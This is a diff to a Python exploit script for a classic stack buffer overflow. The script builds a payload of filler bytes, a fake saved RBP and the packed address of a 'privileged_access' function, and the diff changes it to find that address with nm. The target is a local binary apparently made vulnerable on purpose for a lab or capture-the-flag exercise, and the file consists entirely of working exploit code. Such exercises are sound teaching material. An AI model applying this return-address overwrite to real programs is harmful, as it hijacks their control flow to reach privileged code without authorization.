@@ -1,23 +1,37 @@
 #!/usr/bin/env python3
+import subprocess
 import struct
 import sys
 
-# Address of privileged_access function from GDB
-PRIV_FUNC_ADDR = 0x0000000000401256
+# Path to your binary
+BINARY = "./buffer_overflow"
+FUNC_NAME = "privileged_access"
 
-# In x86_64, the typical stack frame looks like:
-# [buffer (16 bytes)][saved rbp (8 bytes)][return address (8 bytes)]
+def get_func_address(binary, func_name):
+    """Uses nm to find the address of a function in the binary."""
+    try:
+        output = subprocess.check_output(["nm", binary], text=True)
+        for line in output.splitlines():
+            if func_name in line:
+                addr_str = line.split()[0]
+                return int(addr_str, 16)
+    except subprocess.CalledProcessError as e:
+        sys.stderr.write(f"[!] Failed to run nm: {e}\n")
+    except Exception as e:
+        sys.stderr.write(f"[!] Error parsing address: {e}\n")
+    return None
 
-# Start with filling the buffer (16 bytes)
-payload = b"A" * 16
+def main():
+    addr = get_func_address(BINARY, FUNC_NAME)
+    if addr is None:
+        sys.stderr.write(f"[!] Could not find function: {FUNC_NAME}\n")
+        sys.exit(1)
 
-# Add bytes to overwrite the saved base pointer (rbp)
-# This doesn't need to be a valid address since we're just trying to reach the return address
-payload += b"B" * 8
+    payload = b"A" * 16           # buffer
+    payload += b"B" * 8           # saved RBP
+    payload += struct.pack("<Q", addr)  # return address = privileged_access
 
-# Add the address of privileged_access (in little-endian format)
-# This overwrites the return address so when the function returns, it goes to privileged_access
-payload += struct.pack("<Q", PRIV_FUNC_ADDR)
+    sys.stdout.buffer.write(payload)
 
-# Write the payload to stdout
-sys.stdout.buffer.write(payload)
+if __name__ == "__main__":
+    main()
